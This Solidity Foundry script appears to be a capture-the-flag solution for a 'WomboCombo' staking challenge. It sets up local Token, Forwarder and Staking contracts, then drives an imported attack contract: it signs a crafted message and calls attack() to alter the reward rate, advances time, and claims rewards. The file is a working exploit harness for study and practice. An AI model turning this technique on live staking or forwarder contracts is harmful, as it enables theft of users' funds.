// SPDX-License-Identifier: MIT
pragma solidity >=0.6.2 <0.9.0;

import "forge-std/Test.sol";
import "forge-std/Script.sol";
import "forge-std/console2.sol";
import "./WomboComboAttack.sol";

contract Attacker is Test, Script {
    address deployer = makeAddr("deployer");
    uint256 attacker_key = vm.envUint("ATTACKER_KEY");
    address attacker = vm.addr(attacker_key);

    Challenge challenge;

    function setUp() public {
        vm.createSelectFork("mainnet");
        vm.startPrank(deployer, deployer);
        deal(attacker, 1 ether);

        Token token = new Token("Staking", "STK", 100 * 10 ** 18);
        Token reward = new Token("Reward", "RWD", 100_000_000 * 10 ** 18);

        Forwarder forwarder = new Forwarder();

        Staking staking = new Staking(token, reward, address(forwarder));

        staking.setRewardsDuration(20);
        reward.transfer(address(staking), reward.totalSupply());
        token.transfer(attacker, token.totalSupply());

        challenge = new Challenge(staking, forwarder);

        vm.stopPrank();
        console2.log("setUp done!");
    }

    function testExploit() public {
        vm.startPrank(attacker, attacker);

        solve();
        console.log("isSolved:", challenge.isSolved());

        vm.stopPrank();
    }

    function solve() public {
        Token stk = challenge.staking().stakingToken();
        WomboComboAttack attack = new WomboComboAttack(challenge);
        stk.transfer(address(attack), stk.balanceOf(attacker));

        attack.constructCalldata();
        attack.constructMessage();
        bytes32 message = attack.message();
        (uint8 v, bytes32 r, bytes32 s) =  vm.sign(attacker_key, message);
        bytes memory signature = abi.encodePacked(r, s, v);
        attack.attack(signature);

        console2.log(challenge.staking().rewardRate());
        console2.log(challenge.staking().finishAt());

        vm.warp(block.timestamp + 20);
        attack.solve();

    }
}


